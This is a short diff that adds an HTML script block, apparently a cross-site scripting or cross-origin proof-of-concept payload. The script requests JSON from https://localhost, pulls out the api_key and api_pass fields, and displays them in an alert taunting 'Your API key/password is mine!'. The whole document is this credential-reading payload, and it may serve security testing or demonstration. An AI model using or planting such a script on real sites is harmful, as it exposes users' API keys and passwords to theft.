@@ -1,0 +1,14 @@
+<script>
+	var url = "https://localhost"
+
+	var xmlhttp = new XMLHttpRequest();
+	xmlhttp.onreadystatechange = function() {
+	  if (this.readyState == 4 && this.status == 200) {
+	  	json = JSON.parse(this.responseText);
+	    alert("Your API key/password is mine! " + "key is " + json.api_key + " and pass is " + json.api_pass);
+	  }
+	};
+	xmlhttp.open('GET', url);
+	xmlhttp.send();
+
+</script>
